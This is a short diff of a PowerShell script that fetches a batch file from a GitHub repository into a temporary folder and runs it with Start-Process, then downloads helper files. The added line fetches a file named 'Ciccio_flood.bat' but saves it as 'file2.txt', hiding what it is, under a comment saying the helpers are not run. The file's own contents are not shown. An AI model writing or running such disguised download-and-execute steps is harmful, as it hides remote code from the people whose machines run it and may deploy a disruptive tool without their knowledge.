@@ -7,5 +7,6 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script
 Start-Process "$tempFolder\OMEGAScript.bat"
 
 # Download the helper files (do not run them)
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/file2.txt' -OutFile "$tempFolder\file2.txt"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/Ciccio_flood.bat' -OutFile "$tempFolder\file2.txt"
+
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/file3.ps1' -OutFile "$tempFolder\file3.ps1"
